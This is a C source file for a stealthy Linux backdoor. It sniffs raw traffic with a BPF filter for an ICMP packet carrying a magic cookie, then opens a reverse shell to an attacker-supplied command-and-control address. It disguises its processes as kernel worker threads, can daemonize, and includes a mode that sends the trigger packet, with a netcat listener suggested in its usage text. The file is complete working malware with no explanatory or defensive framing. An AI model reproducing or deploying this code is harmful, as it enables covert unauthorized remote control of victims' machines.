#define _GNU_SOURCE
#include <linux/filter.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <signal.h>

#ifndef MAGIC_COOKIE
#define MAGIC_COOKIE 0xC0DEBABE
#endif

#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif

#define FAKE_PARENT  "kworker/u4:2"
#define FAKE_SHELL   "kworker/u4:3"
#define SHELL_PATH   "/bin/sh"

static struct sock_filter bpf_insns[] = {
    BPF_STMT(BPF_LD  | BPF_H   | BPF_ABS, 12),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0x0800, 0, 6),
    BPF_STMT(BPF_LD  | BPF_B   | BPF_ABS, 23),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_ICMP, 0, 4),
    BPF_STMT(BPF_LD  | BPF_B   | BPF_ABS, 34),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 8, 0, 2),
    BPF_STMT(BPF_LD  | BPF_W   | BPF_ABS, 42),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, MAGIC_COOKIE, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, 0xFFFFFFFF),
    BPF_STMT(BPF_RET | BPF_K, 0),
};

static struct sock_fprog bpf_prog = {
    .len    = sizeof(bpf_insns) / sizeof(bpf_insns[0]),
    .filter = bpf_insns,
};

static void masquerade(int argc, char **argv, const char *name)
{
    prctl(PR_SET_NAME, name, 0, 0, 0);
    if (argc > 0 && argv && argv[0]) {
        size_t cap = strlen(argv[0]);
        if (cap > 0) {
            memset(argv[0], 0, cap);
            strncpy(argv[0], name, cap);
        }
    }
}

static void spawn_shell(uint32_t c2_addr_net, uint16_t c2_port_net)
{
    int tcp = socket(AF_INET, SOCK_STREAM, 0);
    if (tcp < 0) return;

    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = c2_addr_net;
    sa.sin_port        = c2_port_net;

    if (connect(tcp, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(tcp);
        return;
    }

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        close(tcp);
        return;
    }

    signal(SIGCHLD, SIG_DFL);

    pid_t pid = fork();
    if (pid < 0) {
        close(tcp); close(sv[0]); close(sv[1]);
        return;
    }

    if (pid == 0) {
        close(tcp);
        close(sv[1]);
        prctl(PR_SET_NAME, FAKE_SHELL, 0, 0, 0);
        dup2(sv[0], STDIN_FILENO);
        dup2(sv[0], STDOUT_FILENO);
        dup2(sv[0], STDERR_FILENO);
        if (sv[0] > 2) close(sv[0]);
        char *sh_argv[] = { FAKE_SHELL, "-i", NULL };
        char *sh_envp[] = {
            "TERM=xterm-256color",
            "HOME=/root",
            "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
            NULL
        };
        execve(SHELL_PATH, sh_argv, sh_envp);
        _exit(1);
    }

    close(sv[0]);

    char buf[4096];
    int maxfd = (tcp > sv[1] ? tcp : sv[1]) + 1;

    for (;;) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(tcp, &rfds);
        FD_SET(sv[1], &rfds);

        if (select(maxfd, &rfds, NULL, NULL, NULL) < 0) {
            if (errno == EINTR) continue;
            break;
        }

        if (FD_ISSET(tcp, &rfds)) {
            ssize_t n = read(tcp, buf, sizeof(buf));
            if (n <= 0) break;
            if (write(sv[1], buf, n) < 0) break;
        }

        if (FD_ISSET(sv[1], &rfds)) {
            ssize_t n = read(sv[1], buf, sizeof(buf));
            if (n <= 0) break;
            if (write(tcp, buf, n) < 0) break;
        }
    }

    close(tcp);
    close(sv[1]);
    kill(pid, SIGTERM);
    waitpid(pid, NULL, 0);
}

static uint16_t icmp_cksum(const void *buf, size_t len)
{
    const uint16_t *p = (const uint16_t *)buf;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

static int do_send(const char *target, const char *c2_str, uint16_t c2_port)
{
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s < 0) { perror("socket"); return 1; }

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    if (inet_pton(AF_INET, target, &dst.sin_addr) != 1) {
        fprintf(stderr, "[-] bad target: %s\n", target);
        close(s); return 1;
    }

    uint32_t c2_addr;
    if (inet_pton(AF_INET, c2_str, &c2_addr) != 1) {
        fprintf(stderr, "[-] bad c2 ip: %s\n", c2_str);
        close(s); return 1;
    }

    uint8_t pkt[18];
    memset(pkt, 0, sizeof(pkt));
    pkt[0] = 8;
    pkt[1] = 0;
    pkt[4] = 0x13; pkt[5] = 0x37;
    pkt[6] = 0x00; pkt[7] = 0x01;

    uint32_t magic_net = htonl(MAGIC_COOKIE);
    uint16_t port_net  = htons(c2_port);
    memcpy(pkt + 8,  &magic_net, 4);
    memcpy(pkt + 12, &c2_addr,   4);
    memcpy(pkt + 16, &port_net,  2);

    uint16_t ck = icmp_cksum(pkt, sizeof(pkt));
    memcpy(pkt + 2, &ck, 2);

    if (sendto(s, pkt, sizeof(pkt), 0,
               (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        perror("sendto"); close(s); return 1;
    }
    close(s);

    printf("[+] trigger sent  target=%-16s  c2=%s:%u  magic=0x%08X\n",
           target, c2_str, c2_port, (unsigned)MAGIC_COOKIE);
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc >= 2 && strcmp(argv[1], "--send") == 0) {
        if (argc < 5) {
            fprintf(stderr,
                "usage: %s --send TARGET C2_IP C2_PORT\n"
                "       (then: nc -lvnp C2_PORT)\n", argv[0]);
            return 1;
        }
        return do_send(argv[2], argv[3], (uint16_t)atoi(argv[4]));
    }

    int daemon_mode = (argc >= 2 && strcmp(argv[1], "--daemon") == 0);
    if (daemon_mode) {
        pid_t p = fork();
        if (p < 0) { perror("fork"); return 1; }
        if (p > 0) return 0;
        if (setsid() < 0) _exit(1);
        p = fork();
        if (p < 0) _exit(1);
        if (p > 0) _exit(0);
        int nd = open("/dev/null", O_RDWR);
        if (nd >= 0) {
            dup2(nd, STDIN_FILENO);
            dup2(nd, STDOUT_FILENO);
            dup2(nd, STDERR_FILENO);
            if (nd > 2) close(nd);
        }
    }

    masquerade(argc, argv, FAKE_PARENT);
    signal(SIGCHLD, SIG_IGN);

    int raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw < 0) { perror("socket"); return 1; }

    if (setsockopt(raw, SOL_SOCKET, SO_ATTACH_FILTER,
                   &bpf_prog, sizeof(bpf_prog)) < 0) {
        perror("SO_ATTACH_FILTER");
        close(raw); return 1;
    }

    if (!daemon_mode)
        fprintf(stderr, "[*] listening  comm=%s  magic=0x%08X\n",
                FAKE_PARENT, (unsigned)MAGIC_COOKIE);

    uint8_t buf[256];

    for (;;) {
        ssize_t n = recvfrom(raw, buf, sizeof(buf), 0, NULL, NULL);
        if (n < 0) {
            if (errno == EINTR) continue;
            break;
        }
        
        if (n < 52) continue;

        uint32_t c2_addr_net;
        uint16_t c2_port_net;
        memcpy(&c2_addr_net, buf + 46, 4);
        memcpy(&c2_port_net, buf + 50, 2);
        if (c2_addr_net == 0 || c2_port_net == 0) continue;

        pid_t pid = fork();
        if (pid == 0) {
            close(raw);
            spawn_shell(c2_addr_net, c2_port_net);
            _exit(1);
        }
    }

    close(raw);
    return 0;
}
